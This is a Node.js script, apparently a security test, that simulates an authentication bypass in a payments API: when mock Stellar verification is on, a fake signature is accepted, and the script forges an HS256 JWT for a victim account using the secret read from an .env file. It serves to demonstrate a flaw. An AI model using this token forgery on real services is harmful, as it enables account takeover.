const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

function loadEnv(envPath) {
  if (!fs.existsSync(envPath)) return {};
  const content = fs.readFileSync(envPath, 'utf8');
  const obj = {};
  for (const line of content.split('\n')) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const i = trimmed.indexOf('=');
    if (i === -1) continue;
    const k = trimmed.substring(0,i).trim();
    const v = trimmed.substring(i+1).trim();
    obj[k] = v;
  }
  return obj;
}

function base64url(buf) {
  return buf.toString('base64')
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');
}

function signHS256(data, secret) {
  return crypto.createHmac('sha256', secret).update(data).digest();
}

(async function main(){
  const env = loadEnv(path.join(__dirname, '..', 'apps', 'api', '.env'));
  const JWT_SECRET = env.JWT_SECRET || 'dev_jwt_secret_for_security_test';
  const JWT_EXP = 24 * 60 * 60; // seconds

  // Victim user (would be created via POST /users/register in real flow)
  const victim = {
    id: 42,
    stellar_address: 'GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF',
    username: 'victim1',
  };

  // Challenge that would be returned by POST /auth/challenge
  const challenge = 'micopay-auth-deadbeef-1234567890';

  // Attacker provides fake signature (but MOCK_STELLAR=true makes server skip verification)
  const fakeSignature = 'fakesig';

  // Simulate server issuing JWT (same payload as auth.ts: { id, stellar_address })
  const header = { alg: 'HS256', typ: 'JWT' };
  const now = Math.floor(Date.now() / 1000);
  const payload = { id: victim.id, stellar_address: victim.stellar_address, iat: now, exp: now + JWT_EXP };

  const headerB = Buffer.from(JSON.stringify(header));
  const payloadB = Buffer.from(JSON.stringify(payload));
  const signingInput = `${base64url(headerB)}.${base64url(payloadB)}`;
  const signature = base64url(signHS256(signingInput, JWT_SECRET));
  const token = `${signingInput}.${signature}`;

  console.log('=== Simulated exploit run ===');
  console.log('Victim stellar_address:', victim.stellar_address);
  console.log('Challenge (simulated):', challenge);
  console.log('Attacker signature used:', fakeSignature);
  console.log('MOCK_STELLAR=true => signature verification skipped');
  console.log('Issued JWT:\n');
  console.log(token);
  console.log('\nDecoded JWT payload:');
  console.log(JSON.stringify(payload, null, 2));

  // small verification: verify HMAC with secret
  const verifySig = base64url(signHS256(signingInput, JWT_SECRET));
  console.log('\nSignature valid (HMAC check):', verifySig === signature);
})();
